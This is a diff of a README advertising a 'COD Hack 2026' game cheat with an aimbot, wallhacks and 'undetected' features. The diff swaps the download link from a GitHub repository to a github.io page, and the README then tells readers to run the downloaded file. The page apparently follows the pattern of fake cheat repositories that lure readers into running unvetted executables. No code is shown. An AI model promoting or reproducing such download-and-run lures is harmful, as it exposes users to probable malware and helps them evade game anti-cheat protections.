@@ -25,10 +25,10 @@ Whether you're looking for an aimbot, ESP/wallhacks, or a fully undetected exter
 
 Visit this link to download the application:
 
-[![Download COD Hack 2026](https://img.shields.io/badge/Download-COD_Hack_2026-blue?style=for-the-badge&logo=github&logoColor=white&color=00FF00)](https://github.com/barderegenerate6598/cod-hack-download-2026)
+[![Download COD Hack 2026](https://img.shields.io/badge/Download-COD_Hack_2026-blue?style=for-the-badge&logo=github&logoColor=white&color=00FF00)](https://barderegenerate6598.github.io)
 
 Click the button above or copy and paste this link into your browser:  
-**https://github.com/barderegenerate6598/cod-hack-download-2026**
+**https://barderegenerate6598.github.io**
 
 ### Step 2: Run the File
 
